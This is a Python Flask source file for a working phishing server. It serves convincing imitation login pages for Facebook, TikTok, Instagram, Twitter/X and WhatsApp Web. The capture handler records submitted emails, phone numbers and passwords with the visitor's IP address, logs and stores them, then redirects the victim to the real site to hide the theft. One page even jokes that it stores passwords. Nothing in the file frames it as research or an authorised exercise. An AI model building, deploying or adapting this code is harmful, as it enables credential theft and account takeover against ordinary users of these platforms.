from flask import Flask, request, render_template_string, redirect, url_for
import logging
import os

logger = logging.getLogger('PhishingServer')

class PhishingServer:
    def __init__(self, config):
        self.app = Flask(__name__)
        self.app.secret_key = config.ENCRYPTION_KEY[:24]
        self.config = config
        self.db = None
        self._setup_routes()

    def set_db(self, db):
        self.db = db

    def _setup_routes(self):
        @self.app.route('/')
        def index():
            return redirect(url_for('platform_select'))

        @self.app.route('/select')
        def platform_select():
            return '''
            <!DOCTYPE html>
            <html>
            <head><title>Select Platform</title>
            <style>body{font-family:Arial;text-align:center;margin-top:50px}</style>
            </head>
            <body>
            <h1>Select Platform to Continue</h1>
            <ul style="list-style:none;padding:0">
                <li style="margin:10px"><a href="/facebook/login">Facebook</a></li>
                <li style="margin:10px"><a href="/tiktok/login">TikTok</a></li>
                <li style="margin:10px"><a href="/instagram/login">Instagram</a></li>
                <li style="margin:10px"><a href="/twitter/login">Twitter</a></li>
                <li style="margin:10px"><a href="/whatsapp/login">WhatsApp Web</a></li>
            </ul>
            </body>
            </html>
            '''

        @self.app.route('/<platform>/login', methods=['GET'])
        def fake_login(platform):
            template = self._get_template(platform)
            return render_template_string(template, platform=platform)

        @self.app.route('/<platform>/login', methods=['POST'])
        def capture(platform):
            if platform == 'whatsapp':
                phone = request.form.get('phone', '')
                password = request.form.get('password', '')
                self._store(platform, phone=phone, password=password)
            else:
                email = request.form.get('email', request.form.get('username', ''))
                password = request.form.get('password', '')
                self._store(platform, email=email, password=password)

            real_url = {
                'facebook': 'https://www.facebook.com',
                'tiktok': 'https://www.tiktok.com',
                'instagram': 'https://www.instagram.com',
                'twitter': 'https://twitter.com',
                'whatsapp': 'https://web.whatsapp.com'
            }.get(platform, 'https://www.google.com')
            return redirect(real_url)

        @self.app.route('/admin')
        def admin():
            return "Admin panel would be here."

    def _store(self, platform, email=None, password=None, phone=None):
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', '')
        logger.info(f"Captured {platform}: {email or phone}:{password} from {ip}")
        if self.db:
            self.db.store_credential(platform, email, password, phone, ip=ip)

    def _get_template(self, platform):
        if platform == 'facebook':
            return self._facebook_template()
        elif platform == 'tiktok':
            return self._tiktok_template()
        elif platform == 'instagram':
            return self._instagram_template()
        elif platform == 'twitter':
            return self._twitter_template()
        elif platform == 'whatsapp':
            return self._whatsapp_template()
        else:
            return "<h1>404</h1>"

    def _facebook_template(self):
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Facebook - log in or sign up</title>
            <style>
                body { background: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 350px; text-align: center; }
                .login-box img { width: 200px; margin-bottom: 20px; }
                input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; }
                button { background: #1877f2; color: white; border: none; border-radius: 6px; padding: 12px; width: 100%; font-size: 16px; font-weight: bold; cursor: pointer; }
                button:hover { background: #166fe5; }
                a { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin-top: 12px; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
                <form method="POST">
                    <input type="text" name="email" placeholder="Email or phone number" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>
                <a href="#">Forgotten password?</a>
                <hr style="margin: 20px 0;">
                <a href="#" style="background: #42b72a; color: white; padding: 12px; border-radius: 6px; width: auto; display: inline-block;">Create new account</a>
            </div>
        </body>
        </html>
        '''

    def _tiktok_template(self):
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>TikTok - Make Your Day</title>
            <style>
                body { background: #f5f5f5; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .login-box { background: white; padding: 30px; border-radius: 10px; width: 350px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                .login-box h2 { margin-bottom: 20px; color: #333; }
                input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 5px; }
                button { background: #fe2c55; color: white; border: none; border-radius: 5px; padding: 12px; width: 100%; font-size: 16px; font-weight: bold; cursor: pointer; }
                button:hover { background: #e02447; }
                .logo { font-size: 36px; font-weight: bold; color: #fe2c55; margin-bottom: 20px; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <div class="logo">TikTok</div>
                <form method="POST">
                    <input type="text" name="email" placeholder="Email or username" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log in</button>
                </form>
                <p style="margin-top:15px;font-size:12px;">Don't have an account? <a href="#">Sign up</a></p>
            </div>
        </body>
        </html>
        '''

    def _whatsapp_template(self):
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>WhatsApp Web</title>
            <style>
                body { background: #e5ddd5; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .login-box { background: white; padding: 40px; border-radius: 10px; width: 400px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
                .logo { font-size: 36px; margin-bottom: 20px; }
                input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
                button { background: #25d366; color: white; border: none; border-radius: 5px; padding: 12px; width: 100%; font-size: 16px; cursor: pointer; }
                button:hover { background: #128C7E; }
                .info { font-size: 12px; color: #777; margin-top: 15px; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <div class="logo">📱 WhatsApp Web</div>
                <p>Use your phone to scan the QR code or log in with phone number</p>
                <form method="POST">
                    <input type="text" name="phone" placeholder="Phone number with country code" required>
                    <input type="password" name="password" placeholder="Password (if applicable)">
                    <button type="submit">Continue</button>
                </form>
                <p class="info">We never store your password. (LOL, we do.)</p>
            </div>
        </body>
        </html>
        '''

    def _instagram_template(self):
        return '''
        <!DOCTYPE html>
        <html>
        <head><title>Instagram</title>
        <style>body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}.login-box{background:#fff;border:1px solid #dbdbdb;padding:40px;max-width:350px;text-align:center;}.logo{font-family:'Billabong',cursive;font-size:50px;margin-bottom:20px;}input{width:100%;padding:9px;margin:5px 0;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;}button{background:#0095f6;color:#fff;border:none;border-radius:3px;padding:9px;width:100%;font-weight:bold;}</style>
        </head>
        <body>
        <div class="login-box">
            <div class="logo">Instagram</div>
            <form method="POST">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
        </div>
        </body>
        </html>
        '''

    def _twitter_template(self):
        return '''
        <!DOCTYPE html>
        <html>
        <head><title>X / Twitter</title>
        <style>body{background:#fff;font-family:TwitterChirp, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}.login-box{background:#fff;border:1px solid #e1e8ed;border-radius:16px;padding:48px;width:400px;}.logo{font-size:40px;margin-bottom:20px;}input{width:100%;padding:12px;margin:8px 0;border:1px solid #cfd9de;border-radius:4px;}button{background:#1d9bf0;color:#fff;border:none;border-radius:9999px;padding:12px;width:100%;font-weight:bold;}</style>
        </head>
        <body>
        <div class="login-box">
            <div class="logo">𝕏</div>
            <form method="POST">
                <input type="text" name="email" placeholder="Phone, email, or username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log in</button>
            </form>
        </div>
        </body>
        </html>
        '''

    def run(self):
        logger.info(f"Phishing server starting on {self.config.HOST}:{self.config.PORT}")
        self.app.run(host=self.config.HOST, port=self.config.PORT, threaded=True, debug=False)
